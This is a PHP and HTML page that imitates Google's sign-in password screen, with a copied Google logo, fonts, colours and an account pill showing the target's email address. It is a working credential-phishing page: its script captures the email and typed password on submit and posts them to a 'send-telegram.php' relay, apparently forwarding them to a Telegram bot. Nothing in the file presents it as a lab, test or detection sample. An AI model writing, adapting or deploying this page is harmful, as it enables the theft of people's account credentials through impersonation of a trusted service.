<?php
// Get the email from the previous page
$email = $_GET['email'] ?? $_POST['email'] ?? 'user@example.com';
$email = htmlspecialchars($email);

$error = '';
$password = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $password = $_POST['password'] ?? '';
    
    if (empty($password)) {
        $error = 'Enter a password';
    } else {
        // Prototype success â€“ you can redirect or show a message
        // header('Location: success.php');
        // exit;
        $success = true;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
        }

        body {
            background-color: #f0f4f9;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .card {
            background: white;
            border-radius: 28px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.08);
            width: 100%;
            max-width: 450px;
            padding: 48px 40px 36px;
        }

        /* Google Logo */
        .google-logo {
            width: 40px;
            height: 40px;
            margin-bottom: 16px;
        }

        h1 {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            margin-bottom: 16px;
        }

        /* Account pill */
        .account-pill {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            border: 1px solid #dadce0;
            border-radius: 16px;
            padding: 4px 12px 4px 6px;
            font-size: 14px;
            color: #3c4043;
            cursor: pointer;
            margin-bottom: 32px;
            background: white;
            transition: background 0.2s;
        }

        .account-pill:hover {
            background: #f8f9fa;
        }

        .account-pill .user-icon {
            width: 20px;
            height: 20px;
            background: #5f6368;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 12px;
        }

        .account-pill .dropdown {
            font-size: 10px;
            color: #5f6368;
            margin-left: 2px;
        }

        .input-group {
            margin-bottom: 8px;
        }

        input[type="password"],
        input[type="text"] {
            width: 100%;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            outline: none;
            transition: border-color 0.2s;
        }

        input:focus {
            border-color: #1a73e8;
            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
        }

        .error {
            color: #d93025;
            font-size: 12px;
            margin-top: 6px;
            display: <?php echo $error ? 'block' : 'none'; ?>;
        }

        .show-password {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-top: 12px;
            margin-bottom: 32px;
            font-size: 14px;
            color: #202124;
            cursor: pointer;
            user-select: none;
        }

        .show-password input {
            width: 16px;
            height: 16px;
            cursor: pointer;
            accent-color: #1a73e8;
        }

        .actions {
            display: flex;
            justify-content: flex-end;
            align-items: center;
            gap: 24px;
            margin-top: 16px;
        }

        .forgot {
            color: #1a73e8;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
        }

        .forgot:hover {
            text-decoration: underline;
        }

        .next-btn {
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 24px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s, box-shadow 0.2s;
        }

        .next-btn:hover {
            background-color: #1557b0;
            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
        }

        .footer {
            width: 100%;
            max-width: 450px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 24px;
            font-size: 12px;
            color: #5f6368;
        }

        .footer select {
            border: none;
            background: transparent;
            color: #5f6368;
            font-size: 12px;
            cursor: pointer;
            outline: none;
        }

        .footer-links a {
            color: #5f6368;
            text-decoration: none;
            margin-left: 24px;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        .success-message {
            background: #e6f4ea;
            color: #137333;
            padding: 12px 16px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 14px;
        }

        @media (max-width: 480px) {
            .card {
                padding: 36px 24px 28px;
                border-radius: 0;
                box-shadow: none;
            }
            body {
                background: white;
                padding: 0;
            }
        }
    </style>
</head>
<body>

    <div class="card">
        <!-- Official-looking Google "G" logo (SVG) -->
        <svg class="google-logo" viewBox="0 0 40 40" xmlns="http://www.w3.org/2000/svg">
            <path fill="#4285F4" d="M39.6 20.4c0-1.4-.1-2.8-.4-4.1H20.4v7.8h10.8c-.5 2.5-1.9 4.6-3.9 6v5h6.3c3.7-3.4 5.9-8.4 5.9-14.7z"/>
            <path fill="#34A853" d="M20.4 40c5.3 0 9.7-1.7 12.9-4.7l-6.3-5c-1.8 1.2-4 1.9-6.6 1.9-5.1 0-9.4-3.4-10.9-8.1H3v5.1C6.3 35.9 12.9 40 20.4 40z"/>
            <path fill="#FBBC05" d="M9.5 24.1c-.4-1.2-.6-2.5-.6-3.8s.2-2.6.6-3.8V11.4H3C1.7 14 1 16.9 1 20.3s.7 6.3 2 8.9l6.5-5.1z"/>
            <path fill="#EA4335" d="M20.4 8.5c2.9 0 5.5 1 7.5 2.9l5.6-5.6C30.1 2.7 25.7 1 20.4 1 12.9 1 6.3 5.1 3 11.4l6.5 5.1c1.5-4.7 5.8-8 10.9-8z"/>
        </svg>

        <h1>Welcome</h1>

        <!-- Account selector pill -->
        <div class="account-pill" title="Switch account">
            <div class="user-icon">ðŸ‘¤</div>
            <span><?php echo $email; ?></span>
            <span class="dropdown">â–¼</span>
        </div>

        <?php if (!empty($success)): ?>
            <div class="success-message">
                Password accepted .
            </div>
        <?php endif; ?>

        <form method="POST" action="" id ="myForm" >
            <input type="hidden" id ="email" name="email" value="<?php echo $email; ?>">

            <div class="input-group">
                <input 
                    type="text" 
                    id="password" 
                    name="password" 
                    placeholder="Enter your password"
                    autofocus
                    required
                >
                <div class="error"><?php echo htmlspecialchars($error); ?></div>
            </div>

            <label class="show-password">
                <input type="checkbox" id="showPassword">
                Show password
            </label>

            <div class="actions">
                <a href="#" class="forgot">Forgot password?</a>
                <button type="submit" class="next-btn">Next</button>
            </div>
        </form>
    </div>

    <div class="footer">
        <select>
            <option>English (United States)</option>
            <option>EspaÃ±ol</option>
            <option>FranÃ§ais</option>
            <option>Deutsch</option>
        </select>

        <div class="footer-links">
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
    </div>

    <script>
 
document.addEventListener('DOMContentLoaded', function () {

    // Password toggle (keep this if you need it)
    const showPassword = document.getElementById('showPassword');
    if (showPassword) {
        showPassword.addEventListener('change', function () {
            const passwordInput = document.getElementById('password');
            if (passwordInput) {
                passwordInput.type = this.checked ? 'text' : 'password';
            }
        });
    }

    // Form submit
    const form = document.getElementById('myForm');
    if (form) {
        form.addEventListener('submit', function (e) {
            e.preventDefault();

            const email    = document.getElementById('email')?.value || document.getElementById('email')?.value || '';
            const password = document.getElementById('password')?.value || '';

            fetch('send-telegram.php', {          // ← points to your PHP file
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    email: email,
                    password: password
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Telegram response:', data);
                if (data.ok) {
                    alert('Message sent successfully!');
                } else {
                    alert('Error: ' + (data.description || 'Something went wrong'));
                }
            })
            .catch(error => {
                console.error(error);
                alert('Failed to send message');
            });
        });
    }
});


</script>


</body>
</html>
